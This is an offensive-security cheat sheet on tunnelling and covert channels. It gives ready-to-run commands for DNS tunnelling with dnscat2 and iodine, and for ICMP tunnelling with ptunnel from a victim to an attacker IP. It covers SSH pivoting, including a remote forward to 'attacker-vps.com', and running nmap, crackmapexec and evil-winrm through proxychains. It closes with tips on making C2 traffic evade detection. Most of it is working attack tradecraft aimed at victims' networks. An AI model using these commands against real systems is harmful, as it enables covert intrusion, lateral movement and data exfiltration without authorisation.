# Tunneling and Covert Channels

**DNS Tunneling**

bash

```bash
# dnscat2
# Server — needs to be authoritative for a subdomain
ruby dnscat2.rb tunnel.yourdomain.com

# Client (victim)
./dnscat2 tunnel.yourdomain.com

# iodine — full IP tunnel over DNS
# Server
iodined -f -c -P secretpassword 10.53.53.1 tunnel.yourdomain.com

# Client
iodine -P secretpassword tunnel.yourdomain.com
# Now you have a tunnel interface — route traffic through it
```

**ICMP Tunneling**

bash

```bash
# ptunnel
# Server (attacker machine)
ptunnel

# Client (victim — tunnel SSH through ICMP)
ptunnel -p <attacker_ip> -lp 8080 -da <target_ssh_host> -dp 22
ssh -p 8080 user@localhost
```

**SSH Tunneling and Pivoting**

bash

```bash
# Local port forward — reach internal service via jump host
ssh -L <local_port>:<internal_host>:<internal_port> user@jump_host
ssh -L 3306:10.10.10.5:3306 user@192.168.1.10
# Now connect to 127.0.0.1:3306 to reach internal MySQL

# Remote port forward — expose your listener via victim's SSH
ssh -R <remote_port>:localhost:<local_port> user@attacker
ssh -R 4444:localhost:4444 user@attacker-vps.com
# Victim now forwards attacker-vps:4444 to your local port 4444

# Dynamic SOCKS proxy — route all traffic through jump host
ssh -D 1080 user@jump_host
# Configure proxychains to use socks5 127.0.0.1:1080

# Non-interactive (run in background)
ssh -f -N -D 1080 user@jump_host
```

**proxychains:**

bash

```bash
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# Now prefix commands to route through the tunnel
proxychains nmap -sT 10.10.10.0/24   # must use -sT (connect scan) through proxychains
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u admin -p password
```

**HTTP/S C2**

Mature red team frameworks (Cobalt Strike, Havoc, Sliver, Mythic, Brute Ratel) communicate over HTTP/HTTPS because it blends into normal traffic and is almost never blocked.

Characteristics of well-designed HTTP C2:

* Uses legitimate-looking or high-reputation domains
* Mimics browser traffic with realistic headers and user agents
* Irregular callback intervals to avoid beaconing detection
* Optionally fronted through CDNs (Cloudflare, Azure, AWS CloudFront) to hide infrastructure
* HTTP malleable profiles to match known-good traffic patterns
